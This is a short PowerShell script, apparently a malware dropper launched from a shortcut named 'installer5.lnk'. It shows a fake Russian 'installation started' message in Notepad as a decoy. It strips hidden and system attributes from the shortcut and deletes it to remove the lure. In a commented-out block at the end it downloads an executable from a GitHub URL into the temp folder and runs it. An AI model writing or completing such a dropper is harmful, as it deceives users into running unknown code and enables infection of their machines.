$txt = "$env:TEMP\info.txt"

@"
Установка запущена5.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$folder = (Get-Location).Path

$lnk = Join-Path $folder "installer5.lnk"
$txt = Join-Path $folder "installer.txt"

attrib -r -s -h $lnk
# [System.IO.File]::Delete($lnk)

# Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
#     "-Command",
#     "Start-Sleep 5; if(Test-Path '$lnk'){ Remove-Item -LiteralPath '$lnk' -Force -Verbose }"
# )

$cmd = @"
Start-Sleep 5
Write-Host "Проверяем: $lnk"
Test-Path "$lnk"
Remove-Item -LiteralPath "$lnk" -Force -Verbose
Read-Host "Нажмите Enter"
"@

Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $cmd

# @"
# Установка запущена.

# Пожалуйста, подождите...
# "@ | Out-File $txt -Encoding UTF8

# $wc = New-Object System.Net.WebClient
# $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
# & "$env:TEMP\a.exe"
